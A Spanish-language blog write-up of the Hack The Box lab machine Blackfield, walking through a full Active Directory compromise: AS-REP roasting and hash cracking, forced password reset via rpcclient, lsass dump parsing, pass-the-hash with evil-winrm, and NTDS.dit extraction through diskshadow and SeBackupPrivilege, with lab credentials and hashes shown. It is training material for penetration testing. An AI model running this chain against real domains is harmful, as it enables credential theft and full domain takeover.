---
layout: single
title: Blackfield - Hack The Box
excerpt: "Directorio Activo"
date: 2024-02-11
classes: wide
header:
  teaser: /assets/images/htb-blackfield/blackfield1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - Windows
  - AD
  - Kerberos
---

# 10.10.10.192 - Blackfield

![](/assets/images/htb-blackfield/blackfield1.png)

--------------------
# Parte 1: Reconocimiento inicial

Primero hacemos un scaneo de puertos con nmap, salen los tipicos de windows de directorio activo (smb, ldap, kerberos, rpc...)
```bash
└─$ nmap -sCV 10.10.10.192 -p- --open -vvv -Pn -n
PORT     STATE    SERVICE       REASON      VERSION
88/tcp   open     kerberos-sec  syn-ack     Microsoft Windows Kerberos (server time: 2024-02-05 17:44:06Z)
135/tcp  open     msrpc         syn-ack     Microsoft Windows RPC
139/tcp  filtered netbios-ssn   no-response
389/tcp  open     ldap          syn-ack     Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds? syn-ack
593/tcp  open     ncacn_http    syn-ack     Microsoft Windows RPC over HTTP 1.0
5985/tcp open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Ahora con smb haremos un pequeño reconocimiento de sistema operativo y el nombre de dominio, nos sale "Blackfield.local", que 
incluiremos en el `/etc/hosts` asociado a su IP (`echo -e "10.10.10.192\tblackfield.local" >> /etc/hosts`)
```bash
└─$ nxc smb 10.10.10.192
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
```
Con ldap, tambien podemos conseguir dicha información. Vemos que necesitamos credenciales.
```bash
└─$ ldapsearch -H ldap://10.10.10.192 -x -s base namingcontexts | grep -v "#"  
namingcontexts: DC=BLACKFIELD,DC=local
(...)

└─$ ldapsearch -H ldap://10.10.10.192 -x -b "DC=BLACKFIELD,DC=local" | grep -v "#"
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563
```
--------------------
# Parte 2: Ataque por Kerberos

Probamos a enumerar smb, no esta habilitada la null session (porque es un windows 10 y se desactivó) pero si está la 
guest session (invitado). Vemos que hay un tenemos acceso a "IPC$" (nunca suele haber nada interesante) y a "profiles$"
Dentro de profiles encontramos un montón de directorios con 0 archivos. Aún así al ser nombres nos será de utilidad para
obtener una lista de usaurios posibles.
```bash
└─$ nxc smb 10.10.10.192 -u "" -p "" --shares
(...)
SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED

└─$ nxc smb 10.10.10.192 -u "guest" -p "" --shares
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share
SMB         10.10.10.192    445    DC01             profiles$       READ
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share

└─$ smbclient //10.10.10.192/forensic -U "guest%" -c "dir"
NT_STATUS_ACCESS_DENIED listing \*

└─$ smbclient //10.10.10.192/profiles$ -U "guest%" -c "dir"
  .                                   D        0  Wed Jun  3 18:47:12 2020
  ..                                  D        0  Wed Jun  3 18:47:12 2020
  AAlleni                             D        0  Wed Jun  3 18:47:11 2020
  ABarteski                           D        0  Wed Jun  3 18:47:11 2020
  (...)

└─$ smbclient //10.10.10.192/profiles$ -U "guest%" -c "dir" | awk '{print $1}' | grep -vE "^\.|[0-9]" > users.txt
```

Mediante kerberos, le pasamos esa lista a la herramienta kerbrute y tras un rato nos saca tres usaurios posibles que meteremos en "valid users". Al ser un catch de flag, vemos que de todos los usuarios que había, solo han salido validos los que tienen nombres en minusculas ("audit2020" si, "ABarteski" no). Con Impacket-GetNPUsers obtenemos el hash de uno de esos usarios 
por medio de kerberoasting (support)

```bash
└─$ kerbrute userenum --dc 10.10.10.192 -d blackfield.local users.txt
2024/02/05 12:11:45 >  [+] VALID USERNAME:	audit2020@blackfield.local
2024/02/05 12:13:43 >  [+] VALID USERNAME:	svc_backup@blackfield.local
2024/02/05 12:13:43 >  [+] VALID USERNAME:	support@blackfield.local

└─$ echo -e "audit2020\nsvc_backup\nsupport" > valid_users.txt

└─$ impacket-GetNPUsers blackfield.local/ -dc-ip 10.10.10.192 -no-pass -usersfile valid_users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:5028b4ba0968f776d68aed9905bf2b62$a9a524f503b3dc095c095b72f6af17736a53150810d49ade400d90e0e8e7c12a4a3caac3f643edca17f22a6bffba2d573b392fb94858e3b3cf6874f3e57d28adaa2ec6f594d580b6c58f96b3d488d482b24b00b8b78f107de0843ce5aba29be697b2b5d3263f4c4716104f10afeae7b38992009161f5e9da1fe400438c0a6c4cd3eeb02c51a2e3cd5d33c4a87827b14101a50774cc6ae16c1179af235e7116af125c8f7599dda79fa70483b0c9a074ad42d19d6292dd02453a95a9b61237d96bd831e76c9fcc7945d6a402152bec92378eec8eba225e72177ece60528576fba74cf02affc8153f4d4b06fad8205977f7e0838e96
```
Copiamos el hash en el archivo `hash`
```bash
└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
(...)

└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt  --show
$krb5asrep$23$support@BLACKFIELD.LOCAL:8713342...:#00^BlackKnight
```
--------------------
# Parte 3: Enumerando el AD

Ahora al tener credenciales, podemos por ejemplo obtener mas información por ldap (con ldapdomaindump o bloodhound-python
ya que ldapseach devuelve mas de 20000 lineas de output). En este caso optamos por bloodhound y los archivos ".json" que
genere, los metemos en "info.zip" (`zip info.zip *.json`), el cual subiremos a la herramienta bloodhound (ya sabemos, para ejecutarlo es `sudo neo4j console` y `bloodhound &>/dev/null &; disown`)

```bash
└─$ bloodhound-python -u 'support' -p "#00^BlackKnight" -ns 10.10.10.192 -d blackfield.local -c all
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.blackfield.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 316 users
```
--------------------
# Parte 4: Escalando privilegios

![](/assets/images/htb-blackfield/blackfield2.png)
Vemos que support tiene el derecho (ACL) de `Force-ChangePassword` sobre "audit2020". La manera de explotar esta ACL desde fuera
de la máquina es por rpcclient con el comando `'setuserinfo2 <usaurios> 23 <contraseña>'`. Comprobamos con nxc si las 
credenciales han cambiado y sí.
```bash
└─$ rpcclient -U "support%#00^BlackKnight" 10.10.10.192 -c 'setuserinfo2 audit2020 23 pass123!'

└─$ nxc smb 10.10.10.192 -u audit2020 -p pass123!
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:pass123!
```

No podemos conectarnos por Win-rm porque no esta en el grupo `Remote-Management-Users` pero si podemos acceder a nuevos recursos
por SMB, En este caso "forensic", el cual tiene una carpeta llamada "memory-analysis"
```bash
└─$ nxc smb 10.10.10.192 -u audit2020 -p pass123! --shares | grep "READ"
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 

└─$ smbclient //10.10.10.192/forensic -U 'audit2020%pass123!'
smb: \> dir
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 22:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020
smb: \> dir memory_analysis\
  .                                   D        0  Thu May 28 22:28:33 2020
  ..                                  D        0  Thu May 28 22:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 22:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 22:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 22:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 22:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 22:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 22:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 22:25:25 2020
(...)
```
De todos estos archivos, el más comprometido es "lsass" ya que es el proceso que se encarga de almacenar credenciales. 
Si lo unzipeamos, obtenemos el dumpeo de memoria "lsass.DMP", que con `pypykatz` (una version en python y local de mimikatz),
podemos tratar para conseguir hashes.
```bash
└─$ unzip lsass.zip       
Archive:  lsass.zip
  inflating: lsass.DMP

└─$ pypykatz lsa minidump ./lsass.DMP > dump_data
```
Hacemos un filtrado de todos los hashes NTLM y de todos los usuarios. Para obtener dos listas, que bruteforcear con nxc. 
Obtenemos el hash correspondiente al usuario "svc-backup". Podemos hacer un pass the hash con evil-winrm, asi que tenemos
la flag del usaurio.
```bash
└─$ cat dump_data
FILE: ======== ./lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
    == MSV ==
        Username: svc_backup
        Domain: BLACKFIELD
        LM: NA
        NT: 9658d1d1dcd9250115e2205d9f48400d

└─$ cat dump_data | grep "NT" | sort -u | awk '{print $2}' FS=":" | tr -d " " > hashes.txt

└─$ cat dump_data | grep "username" | awk '{print $2}' | sort -u > users2.txt

└─$ nxc winrm 10.10.10.192 -u users2.txt -H hashes.txt | grep "+"
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)

└─$ evil-winrm -i 10.10.10.192 -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
<la_flag>

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv
SeBackupPrivilege             Back up files and directories  Enabled
```
--------------------
# Parte 5: Comprometiendo el dominio entero

![](/assets/images/htb-blackfield/blackfield3.png)
Como svc_backup tiene el ACL `SeBackupPrivilege` (ya que pertenece al grupo `BackupOperators`) podemos hacer copias de archivos protegidos aunque no tengamos derechos sobre
ellos (nos saltamos sus ACLs por tanto). Podemos obtener las credenciales de todo el systema, guardandonos con `reg save` 
la clave de registro `system` ("bootkey del sistema")
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> mkdir C:\Temp

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cd C:\Temp\

*Evil-WinRM* PS C:\Temp> reg save HKLM\system system
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> download system
```
Luego, para dumpear el NTDS.dit y obtener las credenciales de todo el dominio, tenemos que crear un archivo de instrucciones en 
batch que cree un volumen "z" y sea un alias de (explicar mejor) y con diskshadow, le psasamos esas instrucciones y genera
dicha copia en z: Con robocopy, hacemos una copia del NTDS.dit al directorio actial y lo descargamos.
```bash
└─$ echo -e "set context persistent nowriters \nadd volume c: alias wtf \ncreate \nexpose %wtf% z: " > instructions.txt

*Evil-WinRM* PS C:\Temp> upload instructions.txt

*Evil-WinRM* PS C:\Temp> diskshadow.exe /s C:\Temp\instructions.txt
(...)
The shadow copy was successfully exposed as z:\.

*Evil-WinRM* PS C:\Temp> robocopy /b z:\WIndows\NTDS\ . ntds.dit

*Evil-WinRM* PS C:\Temp> download ntds.dit
```

Con secretsdump, ya tenemos lo necesario para obtener los hashes de todos los usuarios del dominio.
```bash
└─$ impacket-secretsdump -system system -ntds ntds.dit LOCAL > hashes

└─$ cat hashes | grep "Administrator"
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::

└─$ evil-winrm -i 10.10.10.192 -u 'Administrator' -H 184fb5e5178480be64824d4cd53b99ee
```
